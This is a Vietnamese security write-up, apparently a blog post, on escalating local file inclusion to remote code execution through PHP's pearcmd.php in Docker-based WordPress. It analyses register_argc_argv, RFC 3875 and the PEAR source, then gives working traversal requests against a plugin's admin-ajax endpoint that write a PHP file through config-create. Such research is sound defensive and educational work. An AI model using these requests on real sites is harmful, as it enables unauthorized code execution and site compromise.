# Exploiting LFI2RCE Vulnerability via PHP PEARCMD


<!--more-->

Xin chào. Sau khi phân tích 10 CVE liên quan đến LFI trên các plugin WordPress, tôi nhận thấy một rào cản chung: nhiều vector khai thác bị giới hạn bởi yêu cầu **phải có hậu tố `.php`**. Điều này làm giảm đáng kể khả năng khai thác. Trong quá trình tìm hiểu, tôi tìm thấy bài viết [docker-php-include-getshell](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp). Bài đó mô tả cách **bypass ràng buộc `.php`** bằng cách lợi dụng file `pearcmd.php` vốn nằm trong bộ công cụ **PECL**/**PEAR** của PHP và có sẵn trong môi trường WordPress được triển khai trên Docker - một mẹo rất thực tế cho kịch bản không cho upload file.

## PEAR và PECL là gì?
- **PECL (PHP Extension Community Library)**: công cụ dòng lệnh để cài và quản lý extension PHP.  
- **PEAR (PHP Extension and Application Repository)**: thư viện nền tảng cho PECL.

Trước PHP `7.3`, PEAR/PECL thường được cài mặc định.  
Từ PHP `7.4` trở đi, cần biên dịch PHP với `--with-pear` để có chúng.

Tuy nhiên, trong các Docker image PHP chính thức, PEAR/PECL **vẫn thường được cài sẵn**, nằm ở `/usr/local/lib/php`:

```sh
root@e182501c47c4:/var/www/html# ls /usr/local/lib/php
Archive  Console  OS  PEAR  PEAR.php  Structures  System.php  XML  build  data  doc  extensions  pearcmd.php  peclcmd.php  test
```

## `pearcmd.php` và `register_argc_argv`
`pearcmd.php` là một script PHP thiết kế để chạy ở chế độ dòng lệnh, ví dụ:

```sh
php /usr/local/lib/php/pearcmd.php install somepackage
```

Nó xử lý các tham số từ `$argv` và `$argc`. Khi chạy như CLI thì dữ liệu này rõ ràng. Nếu file này được include trong bối cảnh web (do LFI), logic CLI của nó có thể bị lợi dụng.

Điểm then chốt là cấu hình `register_argc_argv`. Nếu `register_argc_argv = On`, PHP sẽ tạo:
- `$argc`
- `$argv`
- `$_SERVER['argv']`

![argv](argv.png "`argv` trong cấu hình PHP")

Khi thiết lập WordPress trên Docker, `register_argc_argv` thường bật mặc định. Vấn đề đặt ra: khi PHP chạy dưới SAPI web (FPM/Apache) và không phải CLI, `$argv` lấy dữ liệu từ đâu?

## Analysis PHP Source Code
Trong PHP core có logic như sau:

```c
if (PG(register_argc_argv)) {
    if (SG(request_info).argc) {
        ...
    } else {
        php_build_argv(SG(request_info).query_string, &PG(http_globals)[TRACK_VARS_SERVER]);
    }
}
```

Nếu không có `argc` (không chạy CLI), PHP gọi `php_build_argv` với `SG(request_info).query_string` - tức **query string** của URL. Ví dụ:

```
http://example.com/index.php?a=b&c=d
```

→ `query_string = "a=b&c=d"`

PHP sẽ dùng query string này để tạo biến `argv`, do đó `$_SERVER['argv']` có thể bị ảnh hưởng bởi query string.

**Hậu quả**:

Khi `pearcmd.php` được include qua LFI trong môi trường web mà `$_SERVER['argv']` được sinh từ query string, attacker có thể điều khiển các tham số dòng lệnh mà `pearcmd.php` đọc được. Do đó, chức năng dòng lệnh của PEAR/PECL có thể bị lợi dụng qua web để thực hiện hành động không mong muốn.

## RFC3875 Explain

RFC3875 (CGI spec) định nghĩa một dạng **"indexed" HTTP query** - tức là chuỗi truy vấn không chứa dấu `=` chưa mã hóa và được gửi qua phương thức GET hoặc HEAD.

Khi gặp loại truy vấn này, server **nên** (`SHOULD`) coi phần query-string như một **search-string**, tách thành các **search-word** bằng dấu `+`:

```
search-string = search-word ( "+" search-word )
search-word = 1*schar
```

Sau khi tách, mỗi `search-word` sẽ được **URL-decode**, có thể mã hóa lại theo hệ thống, rồi **thêm vào danh sách đối số dòng lệnh (`argv`)** của chương trình CGI.

Nói ngắn gọn: nếu query-string không có dấu `=` và là yêu cầu GET hoặc HEAD, máy chủ có thể coi các phần ngăn cách bằng `+` như các tham số dòng lệnh và truyền vào `argv`.

**RFC3875** cho phép server biến một query-string "indexed" (GET/HEAD, không có ký tự `=` chưa mã hóa) thành danh sách từ, rồi đưa vào `argv`. Phần mô tả trong tiêu chuẩn như sau:

```
4.4. The Script Command Line

Some systems support a method for supplying an array of strings to
the CGI script. This is only used in the case of an 'indexed' HTTP
query, which is identified by a 'GET' or 'HEAD' request with a URI
query string that does not contain any unencoded "=" characters. For
such a request, the server SHOULD treat the query-string as a
search-string and parse it into words, using the rules

search-string = search-word ( "+" search-word )
search-word = 1*schar
schar = unreserved | escaped | xreserved
xreserved = ";" | "/" | "?" | ":" | "@" | "&" | "=" | "," |
"$"

After parsing, each search-word is URL-decoded, optionally encoded in
a system-defined manner and then added to the command line argument
list.
```

PHP từng có lỗ hổng liên quan ([CVE-2012-1823](https://nvd.nist.gov/vuln/detail/cve-2012-1823)). Hiện nay, PHP xử lý query-string rộng hơn RFC - ngay cả khi query-string có dấu `=`, nó vẫn có thể được đưa vào `$_SERVER['argv']`.

![equal](equal.png "PHP vẫn thêm query-string có dấu `=` vào $_SERVER['argv']")

## Testing PEAR in CLI
Trong bài viết của tác giả có đề cập đến payload liên quan đến `config-create`, được mô tả là dùng để tạo file cấu hình.

![doc-config](doc-config.png "Mô tả về config-create")

Khi tôi thử chạy lệnh trên CLI:

```sh
root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create
config-create: must have 2 parameters, root path and filename to save as
```

Khi không truyền đủ tham số, chương trình báo lỗi và yêu cầu hai tham số bắt buộc:

* `root path`: thư mục gốc mà PEAR dùng để cài đặt các package và tìm cấu hình.
* `filename`: đường dẫn tới file cấu hình sẽ được tạo ra.

Thử chạy với tham số đầy đủ:

```sh
root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php
Root directory must be an absolute path beginning with "/", was: "test_root_path"
```

Ở đây PEAR yêu cầu `test_root_path` phải là đường dẫn tuyệt đối, tức là phải có dấu `/` ở đầu.

Khi chạy lại với đường dẫn hợp lệ:

```sh
root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php
```

Kết quả trả về:

```text {hl_lines=[9,10,11,12,13,14,16,17,19,28,29,30,43,45]}
Configuration (channel pear.php.net):
=====================================
Auto-discover new Channels     auto_discover    <not set>
Default Channel                default_channel  pear.php.net
HTTP Proxy Server Address      http_proxy       <not set>
PEAR server [DEPRECATED]       master_server    <not set>
Default Channel Mirror         preferred_mirror <not set>
Remote Configuration File      remote_config    <not set>
PEAR executables directory     bin_dir          /test_root_path/pear
PEAR documentation directory   doc_dir          /test_root_path/pear/docs
PHP extension directory        ext_dir          /test_root_path/pear/ext
PEAR directory                 php_dir          /test_root_path/pear/php
PEAR Installer cache directory cache_dir        /test_root_path/pear/cache
PEAR configuration file        cfg_dir          /test_root_path/pear/cfg
directory
PEAR data directory            data_dir         /test_root_path/pear/data
PEAR Installer download        download_dir     /test_root_path/pear/download
directory
Systems manpage files          man_dir          /test_root_path/pear/man
directory
PEAR metadata directory        metadata_dir     <not set>
PHP CLI/CGI binary             php_bin          <not set>
php.ini location               php_ini          <not set>
--program-prefix passed to     php_prefix       <not set>
PHP's ./configure
--program-suffix passed to     php_suffix       <not set>
PHP's ./configure
PEAR Installer temp directory  temp_dir         /test_root_path/pear/temp
PEAR test directory            test_dir         /test_root_path/pear/tests
PEAR www files directory       www_dir          /test_root_path/pear/www
Cache TimeToLive               cache_ttl        <not set>
Preferred Package State        preferred_state  <not set>
Unix file mask                 umask            <not set>
Debug Log Level                verbose          <not set>
PEAR password (for             password         <not set>
maintainers)
Signature Handling Program     sig_bin          <not set>
Signature Key Directory        sig_keydir       <not set>
Signature Key Id               sig_keyid        <not set>
Package Signature Type         sig_type         <not set>
PEAR username (for             username         <not set>
maintainers)
User Configuration File        Filename         /var/www/html/test_filename.php
System Configuration File      Filename         #no#system#config#
Successfully created default configuration file "/var/www/html/test_filename.php"
```

Kết quả cho thấy các đường dẫn con cho từng loại dữ liệu được tự động sinh ra dưới `/test_root_path/pear`. Ở dòng cuối cùng:

```
Successfully created default configuration file "/var/www/html/test_filename.php"
```

File cấu hình được tạo trong thư mục hiện hành, không nằm trong `root_path`. Đây là hành vi mặc định của PEAR: `root_path` chỉ ảnh hưởng đến cấu trúc thư mục cài đặt, không quyết định vị trí lưu file cấu hình.

Khi truy cập file `"/var/www/html/test_filename.php"` trên trình duyệt:

![file-create](file-create.png "Nội dung của test_filename.php được render trên trình duyệt")

File được tạo có chứa thông tin về `test_root_path`.

Tuy nhiên, đó mới chỉ là quá trình thực thi trên CLI. Trong trường hợp khai thác qua web, cần phân tích mã nguồn để xem cách chương trình tiếp nhận và xử lý các tham số được truyền vào.

## `pearcmd` Code Analysis

Trước khi phân tích mã nguồn của `/usr/local/lib/php/pearcmd.php`, cần thiết lập môi trường debug để nắm rõ luồng thực thi - tham khảo: [https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/](https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/)

Sau đó hãy copy toàn bộ mã nguồn **php** từ container về máy thật, giữ nguyên cấu trúc thư mục, để khi debugger dừng tại `/usr/local/lib/php/pearcmd.php` bạn vẫn có thể mở và theo dõi file tương ứng với container:

```
sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/
```

```php {title="/usr/local/lib/php/pearcmd.php"}
require_once 'PEAR.php';
require_once 'PEAR/Frontend.php';
require_once 'PEAR/Config.php';
require_once 'PEAR/Command.php';
require_once 'Console/Getopt.php';

$all_commands = PEAR_Command::getCommands();
...
$argv = Console_Getopt::readPHPArgv();
...
$options = Console_Getopt::getopt2($argv, "c:C:d:D:Gh?sSqu:vV");
array_shift($argv);
...
$command = (isset($options[1][0])) ? $options[1][0] : null;
...
if ($fetype == 'Gtk2') {
    ...
} else {
    do {
        ...
        $cmd = PEAR_Command::factory($command, $config);
        ...
        $ok = $cmd->run($command, $opts, $params);
        if ($ok === false) {
            PEAR::raiseError("unknown command `$command'");
        }
        ...
    } while (false);
}
```

Đầu tiên, tất cả các command sẽ được load vào `$all_commands`

```php
$all_commands = PEAR_Command::getCommands();
```

```php {title="/usr/local/lib/php/PEAR/Command.php"}
public static function getCommands()
{
    if (empty($GLOBALS['_PEAR_Command_commandlist'])) {
        PEAR_Command::registerCommands();
    }
    return $GLOBALS['_PEAR_Command_commandlist'];
}
```

`getCommands()` gọi đến `registerCommands()` để đăng ký các command.

![all_commands](all_commands.png "Tất cả các command được load vào `$all_commands`")

Sau đó `$argv` được khởi tạo

```php
$argv = Console_Getopt::readPHPArgv();
```

```php {title="php/Console/Getopt.php" hl_lines=[4,12]}
public static function readPHPArgv()
{
    global $argv;
    if (!is_array($argv)) {
        if (!@is_array($_SERVER['argv'])) {
            if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) {
                $msg = "Could not read cmd args (register_argc_argv=Off?)";
                return PEAR::raiseError("Console_Getopt: " . $msg);
            }
            return $GLOBALS['HTTP_SERVER_VARS']['argv'];
        }
        return $_SERVER['argv'];
    }
    return $argv;
}
```

Nếu `$argv` không phải mảng (tức là không có dữ liệu hợp lệ), hàm sẽ cố gắng tìm giá trị tương đương ở `$_SERVER['argv']` và trả về, tức các `search-word` đường ta truyền trong URL. ví dụ:

```http
GET /wp-admin/admin-ajax.php?action=geo_mashup_query&object_ids=2&template=../../../../../../../usr/local/lib/php/pearcmd&+config-create+<?=phpinfo();?>+/var/www/html/shell.php HTTP/1.1
```

Quan sát trong debugger:

![argv1](argv1.png "Giá trị của `$argv` trong debugger")

Ngay sau đó `$argv` sẽ được loại bỏ phần tử thứ nhất rồi trở thành đối số của `Console_Getopt::getopt2()`, gía trị trả về gán cho `$options`

```php
array_shift($argv);
$options = Console_Getopt::getopt2($argv, "c:C:d:D:Gh?sSqu:vV");
```

Giá trị bây giờ là:

![argv_options](argv_options.png "Giá trị của `$argv` và `$options` trong debugger")

Biến `$command` được khởi tạo với giá trị `$options[1][0]` tức `config-create` trong trường hợp này.

```php
$command = (isset($options[1][0])) ? $options[1][0] : null;
```

Sau đó 1 `factory` được tạo và gán vào `$cmd`

```php
$cmd = PEAR_Command::factory($command, $config);
```

Khi hover vào `$cmd` ta thấy được các tham số yêu cầu của lệnh `config-create`

![doc](doc.png "Các tham số yêu cầu của lệnh `config-create`")

```php {title="/usr/local/lib/php/PEAR/Command.php" hl_lines=[13,14,15,16]}
public static function &factory($command, &$config)
{
    if (empty($GLOBALS['_PEAR_Command_commandlist'])) {
        PEAR_Command::registerCommands();
    }
    if (isset($GLOBALS['_PEAR_Command_shortcuts'][$command])) {
        $command = $GLOBALS['_PEAR_Command_shortcuts'][$command];
    }
    if (!isset($GLOBALS['_PEAR_Command_commandlist'][$command])) {
        $a = PEAR::raiseError("unknown command `$command'");
        return $a;
    }
    $class = $GLOBALS['_PEAR_Command_commandlist'][$command];
    if (!class_exists($class)) {
        require_once $GLOBALS['_PEAR_Command_objects'][$class];
    }
    if (!class_exists($class)) {
        $a = PEAR::raiseError("unknown command `$command'");
        return $a;
    }
    $ui =& PEAR_Command::getFrontendObject();
    $obj = new $class($ui, $config);
    return $obj;
}
```

Biến `$class` là giá trị của `$GLOBALS['_PEAR_Command_commandlist'][$command]` được khởi trong hàm `registerCommands()` ngay từ ban đầu khi lấy tất cả command bằng `PEAR_Command::getCommands();`

![class](class.png "Giá trị của `$GLOBALS['_PEAR_Command_commandlist'][$command]` và trong debugger")

```php {title="/usr/local/lib/php/PEAR/Command.php"}
$GLOBALS['_PEAR_Command_commandlist'][$command] = $class;
```

Khi khi đó `/usr/local/lib/php/PEAR/Command/Config.php` chứa class `PEAR_Command_Config` sẽ được `require_once`

![requireclass](requireclass.png "/usr/local/lib/php/PEAR/Command/Config.php được require_once")

Trong class `PEAR_Command_Config`, ta thấy có khai báo mảng `$commands` chứa key `config-create`

![config-create-cmd](config-create-cmd.png "$commands được khai báo trong PEAR_Command_Config")

`config-create` là lệnh được thực thi, nó sẽ gọi đến hàm `doConfigSet()`, là hàm xử lý đối với command `config-create`

```php {title="/usr/local/lib/php/PEAR/Command/Config.php" hl_lines=[7,54]}
function doConfigSet($command, $options, $params)
{
    // $param[0] -> a parameter to set
    // $param[1] -> the value for the parameter
    // $param[2] -> the layer
    $failmsg = '';
    if (count($params) < 2 || count($params) > 3) {
        $failmsg .= "config-set expects 2 or 3 parameters";
        return PEAR::raiseError($failmsg);
    }

    if (isset($params[2]) && ($error = $this->_checkLayer($params[2]))) {
        $failmsg .= $error;
        return PEAR::raiseError("config-set:$failmsg");
    }

    $channel = isset($options['channel']) ? $options['channel'] : $this->config->get('default_channel');
    $reg = &$this->config->getRegistry();
    if (!$reg->channelExists($channel)) {
        return $this->raiseError('Channel "' . $channel . '" does not exist');
    }

    $channel = $reg->channelName($channel);
    if ($params[0] == 'default_channel' && !$reg->channelExists($params[1])) {
        return $this->raiseError('Channel "' . $params[1] . '" does not exist');
    }

    if ($params[0] == 'preferred_mirror'
        && (
            !$reg->mirrorExists($channel, $params[1]) &&
            (!$reg->channelExists($params[1]) || $channel != $params[1])
        )
    ) {
        $msg  = 'Channel Mirror "' . $params[1] . '" does not exist';
        $msg .= ' in your registry for channel "' . $channel . '".';
        $msg .= "\n" . 'Attempt to run "pear channel-update ' . $channel .'"';
        $msg .= ' if you believe this mirror should exist as you may';
        $msg .= ' have outdated channel information.';
        return $this->raiseError($msg);
    }

    if (count($params) == 2) {
        array_push($params, 'user');
        $layer = 'user';
    } else {
        $layer = $params[2];
    }

    array_push($params, $channel);
    if (!call_user_func_array(array(&$this->config, 'set'), $params)) {
        array_pop($params);
        $failmsg = "config-set (" . implode(", ", $params) . ") failed, channel $channel";
    } else {
        $this->config->store($layer);
    }

    if ($failmsg) {
        return $this->raiseError($failmsg);
    }

    $this->ui->outputData('config-set succeeded', $command);
    return true;
}
```
Hàm này yêu cầu chỉ được truyền 2 đối số đối với `config-create` 

Sau đó `store()` được gọi 

```php {title="/usr/local/lib/php/PEAR/Command/Config.php" hl_lines=[38,39]}
function store($layer = 'user', $data = null)
{
    return $this->writeConfigFile(null, $layer, $data);
}
```

`writeConfigFile()` được gọi để ghi config file

```php {title="/usr/local/lib/php/PEAR/Command/Config.php" hl_lines=[3]}
function writeConfigFile($file = null, $layer = 'user', $data = null)
{
    $this->_lazyChannelSetup($layer);
    if ($layer == 'both' || $layer == 'all') {
        foreach ($this->files as $type => $file) {
            $err = $this->writeConfigFile($file, $type, $data);
            if (PEAR::isError($err)) {
                return $err;
            }
        }
        return true;
    }

    if (empty($this->files[$layer])) {
        return $this->raiseError("unknown config file type `$layer'");
    }

    if ($file === null) {
        $file = $this->files[$layer];
    }

    $data = ($data === null) ? $this->configuration[$layer] : $data;
    $this->_encodeOutput($data);
    $opt = array('-p', dirname($file));
    if (!@System::mkDir($opt)) {
        return $this->raiseError("could not create directory: " . dirname($file));
    }

    if (file_exists($file) && is_file($file) && !is_writeable($file)) {
        return $this->raiseError("no write access to $file!");
    }

    $fp = @fopen($file, "w");
    if (!$fp) {
        return $this->raiseError("PEAR_Config::writeConfigFile fopen('$file','w') failed ($php_errormsg)");
    }

    $contents = "#PEAR_Config 0.9\n" . serialize($data);
    if (!@fwrite($fp, $contents)) {
        return $this->raiseError("PEAR_Config::writeConfigFile: fwrite failed ($php_errormsg)");
    }
    return true;
}
```

Đây là hàm quyết định việc ghi config file với `serialize($data)` để chuyển cấu hình thành chuỗi có thể lưu trữ.

Cuối cùng, `$cmd` được thực thi bằng `$cmd->run()`

```php
$ok = $cmd->run($command, $opts, $params);
```

## Exploit

Tận dụng [CVE](https://w41bu1.github.io/2025-10-13-cve-2025-48293/) đã phân tích để khai thác mở rộng bằng `pearcmd.php`

Gửi request chứa LFI payload trỏ đến `pearcmd.php`

```http
GET /wp-admin/admin-ajax.php?action=geo_mashup_query&object_ids=2&template=../../../../../../../usr/local/lib/php/pearcmd&+config-create+<?=phpinfo();?>+/var/www/html/shell.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/wp-admin/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: blue
Priority: u=0, i
```

**Response trả về lỗi**:

![res1](res1.png "Response trả về lỗi")

Yêu cầu sử dụng `/<?=phpinfo();?>` thay vì `<?=phpinfo();?>` bởi vì tham số đầu tiên là `<root path>` như phân tích ở trên.

**root path** tức là yêu cầu đường dẫn tuyệt đối.

Sửa payload và gửi lại.

```http
GET /wp-admin/admin-ajax.php?action=geo_mashup_query&object_ids=2&template=../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo();?>+/var/www/html/shell.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/wp-admin/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: blue
Priority: u=0, i
```

**Response trả về thành công**:

![res2](res2.png "Response trả về thành công")

Truy cập `shell.php`

![shell](shell.png "shell.php")
